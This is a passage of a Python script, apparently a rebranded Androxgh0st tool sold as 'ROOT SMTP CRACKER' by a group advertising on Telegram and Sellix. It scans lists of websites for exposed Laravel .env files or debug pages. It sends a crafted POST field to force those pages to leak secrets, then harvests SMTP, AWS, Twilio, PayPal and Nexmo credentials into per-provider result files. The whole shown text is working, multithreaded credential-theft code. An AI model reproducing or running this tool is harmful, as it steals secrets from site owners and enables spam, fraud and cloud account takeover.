						save.close()
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/1and1.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'zoho' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/zoho.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'strato' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/strato.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mandrillapp' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/mandrill.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gmoserver' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/gmoserver.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'rise-tokyo' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/rise-tokyo.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'tatsumi-b' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/tatsumi-b.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mailgun' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/mailgun.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gmail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/gmail.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'googlemail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/googlemail.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mailjet' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/mailjet.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mailtrap' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/mailtrap.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'sendinblue' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/sendinblue.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					else:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILADDR: '+str(mailaddr)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					return True
			else:
				return False
		except:
			return False

def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n'),

def main(url):
	resp = False
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
		if resp:
			getsmtp = androxgh0st().get_smtp(resp, url)
			getwtilio = androxgh0st().get_twillio(resp, url)
			getaws = androxgh0st().get_aws_data(resp, url)
			getpp = androxgh0st().paypal(resp, url)
			getnexmo = androxgh0st().get_nexmo(resp, url)
			if getsmtp:
				text += ' | \033[32;1mSMTP\033[0m'
			else:
				text += ' | \033[31;1mSMTP\033[0m'
			if getaws:
				text += ' | \033[32;1mAWS\033[0m'
			else:
				text += ' | \033[31;1mAWS\033[0m'
			if getwtilio:
				text += ' | \033[32;1mTWILIO\033[0m'
			else:
				text += ' | \033[31;1mTWILIO\033[0m'
			if getpp:
				text += ' | \033[32;1mPAYPAL\033[0m'
			else:
				text += ' | \033[31;1mPAYPAL\033[0m'
			if getnexmo:
				text += ' | \033[32;1mNEXMO\033[0m'
			else:
				text += ' | \033[31;1mNEXMO\033[0m'
		else:
			text += ' | \033[31;1mCan\'t get everything\033[0m'
			save = open('Results/not_vulnerable.txt','a')
			asu = str(url).replace('\r', '')
			save.write(asu+'\n')
			save.close()
	except:
		text = '\033[31;1m#\033[0m '+url
		text += ' | \033[31;1mCan\'t access sites\033[0m'
		save = open('Results/not_vulnerable.txt','a')
		asu = str(url).replace('\r', '')
		save.write(asu+'\n')
		save.close()
	printf(text)


if __name__ == '__main__':
# 	print('''
# L.A.R.A.V.E.L V5
# \n''')
	print("""

d888888b d88888b  .d8b.  .88b  d88.         .d88b.  d8888b.  .d88b.   .d88b.  d888888b 
`~~88~~' 88'     d8' `8b 88'YbdP`88        .8P  88. 88  `8D .8P  Y8. .8P  Y8. `~~88~~' 
   88    88ooooo 88ooo88 88  88  88        88  d'88 88oobY' 88    88 88    88    88    
   88    88~~~~~ 88~~~88 88  88  88 C8888D 88 d' 88 88`8b   88    88 88    88    88    
   88    88.     88   88 88  88  88        `88  d8' 88 `88. `8b  d8' `8b  d8'    88    
   YP    Y88888P YP   YP YP  YP  YP         `Y88P'  88   YD  `Y88P'   `Y88P'     YP    
                                                                                                                                   
			ROOT SMTP CRACKER V1.0  by  TEAM 0ROOT
			 Our Support Contract @teamzerorootsupport_bot 
		            Telegram Channel: @ZeroRootTools_Ru
		        Sellix Shop: https://zeroroottools.sellix.io
""")
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
		tanya = raw_input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\n"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			kntl
	except:
		try:
			lists = sys.argv[1]
			numthread = sys.argv[2]
			readsplit = open(lists).read().splitlines()
		except:
			try:
				lists = raw_input("List: ")
				readsplit = open(lists).read().splitlines()
			except:
				print("List not found!")
				exit()
			try:
				numthread = raw_input("Threads [Max: 200]: ")
			except:
				print("unknown speed!")
				exit()
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			session = open(pid_restore, 'w')
			cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
			session.write(cfgsession)
			session.close()
			print("CTRL+C Detect, Session saved")
			exit()
	pool.wait_completion()
	try:
		os.remove(pid_restore)
	except:
		pass
